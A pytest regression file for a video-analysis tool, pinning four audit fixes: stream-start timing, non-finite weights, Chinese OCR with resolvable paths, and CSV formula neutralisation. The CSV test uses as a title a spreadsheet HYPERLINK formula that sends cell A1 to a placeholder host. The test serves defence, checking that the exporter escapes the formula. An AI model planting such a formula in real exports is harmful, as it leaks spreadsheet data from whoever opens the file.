"""Four small leaks found on 2026-10-09 (overnight audit K2/N2), each pinned.

* motion read PyAV's raw pts while the shot table counts from 0, so a file
  whose stream starts at 6s had every shot's motion credited to the next shot;
* `normalize_weights` refused 0 and negatives but not `inf`/overflow, so one
  weight could turn every `overall` into NaN or 0.0;
* tesseract OCR ran with its default English model and opened keyframe paths
  as stored (68% of a real library stores them relative), so it read Chinese
  captions as Latin noise -- noise that is non-empty and so beat the VLM's
  correct reading -- or silently read nothing at all;
* CSV export wrote scraped titles verbatim, so `=...` became a formula in a
  spreadsheet.
"""
from __future__ import annotations

import csv
import json
import math
import os
import sqlite3
import sys
import tempfile
import types
from unittest.mock import patch

import pytest

from reel_scout import config, db, ingest, motion, ocr


# --- motion ---------------------------------------------------------------

def test_motion_time_is_counted_from_the_stream_start():
    np = pytest.importorskip("numpy")
    from tests.test_motion import _Frame, _fake_av, _mvs

    frames = [_Frame(14, _mvs([(4.0, 0.0)] * 50))]
    mods = _fake_av(frames)
    stream = mods["av"].open("x").streams.video[0]
    type(stream).start_time = 12          # 12 * time_base 0.5 = 6.0 s
    try:
        with patch.dict(sys.modules, mods):
            (t, *_), = list(motion.frame_motion("f.mp4"))
    finally:
        del type(stream).start_time
    assert t == pytest.approx(1.0)        # (14 - 12) * 0.5, not 14 * 0.5


def test_motion_without_a_start_time_is_unchanged():
    pytest.importorskip("numpy")
    from tests.test_motion import _Frame, _fake_av, _mvs

    frames = [_Frame(2, _mvs([(4.0, 0.0)] * 50))]
    with patch.dict(sys.modules, _fake_av(frames)):
        (t, *_), = list(motion.frame_motion("f.mp4"))
    assert t == 1.0


# --- normalize_weights -----------------------------------------------------

@pytest.mark.parametrize("weights", [
    {"hook_strength": "inf"},
    {"hook_strength": float("inf")},
    {"hook_strength": float("nan")},
])
def test_a_non_finite_weight_falls_back_rather_than_poisoning(weights):
    w = ingest.normalize_weights(weights)
    assert all(math.isfinite(v) for v in w.values())
    assert sum(w.values()) == pytest.approx(1.0)


def test_huge_weights_do_not_overflow_to_all_zero():
    w = ingest.normalize_weights({"hook_strength": 1e308, "pacing": 1e308})
    assert sum(w.values()) == pytest.approx(1.0)
    assert w["hook_strength"] == pytest.approx(0.5)
    assert w["pacing"] == pytest.approx(0.5)


# --- OCR -------------------------------------------------------------------

def _fake_tesseract(calls):
    pyt = types.ModuleType("pytesseract")

    def image_to_string(img, lang=None, **kw):
        calls.append({"path": img, "lang": lang})
        return "字幕"

    pyt.image_to_string = image_to_string
    pil = types.ModuleType("PIL")
    image = types.ModuleType("PIL.Image")
    image.open = lambda p: p if os.path.exists(p) else (_ for _ in ()).throw(
        FileNotFoundError(p))
    pil.Image = image
    return {"pytesseract": pyt, "PIL": pil, "PIL.Image": image}


def test_tesseract_is_asked_for_chinese_and_gets_a_resolvable_path(
        monkeypatch, tmp_path):
    # A keyframe stored relative to the data root, the way most rows are.
    data = tmp_path / "data"
    (data / "keyframes" / "v").mkdir(parents=True)
    (data / "keyframes" / "v" / "f.jpg").write_bytes(b"jpg")
    monkeypatch.setattr(config, "DATA_DIR", str(data), raising=False)
    monkeypatch.setattr(config, "VIDEOS_DIR", str(data / "videos"), raising=False)
    monkeypatch.chdir(tmp_path / "..")      # not the data root's parent
    calls = []
    with patch.dict(sys.modules, _fake_tesseract(calls)):
        from reel_scout.utils import paths
        monkeypatch.setattr(paths, "data_root", lambda: data)
        text = ocr._ocr_image("./data/keyframes/v/f.jpg")
    assert text == "字幕"
    assert calls and calls[0]["lang"] == config.OCR_LANG
    assert "chi_tra" in config.OCR_LANG
    assert os.path.isabs(calls[0]["path"])


# --- CSV -------------------------------------------------------------------

def test_csv_neutralises_formula_titles_and_opens_in_excel(tmp_path):
    from reel_scout.export.json_export import export_csv
    fd, path = tempfile.mkstemp(suffix=".db")
    os.close(fd)
    conn = sqlite3.connect(path)
    conn.row_factory = sqlite3.Row
    db.init_db(conn)
    try:
        vid = db.upsert_video(conn, platform="youtube", platform_id="a",
                              url="https://y/a",
                              title='=HYPERLINK("http://x/?"&A1,"點我")',
                              uploader="@handle")
        db.save_analysis(conn, vid, summary="-1 shot", topics_json="[]",
                         hooks_json="{}", style_json="{}",
                         engagement_signals_json="{}",
                         full_json=json.dumps({}))
        out = str(tmp_path / "x.csv")
        assert export_csv(conn, out) == 1
        raw = open(out, "rb").read()
        assert raw.startswith(b"\xef\xbb\xbf")   # Excel reads it as UTF-8
        with open(out, encoding="utf-8-sig", newline="") as f:
            rows = list(csv.DictReader(f))
        assert rows[0]["title"].startswith("'=")
        assert rows[0]["uploader"] == "'@handle"
        assert rows[0]["summary"] == "'-1 shot"
    finally:
        conn.close()
        os.unlink(path)
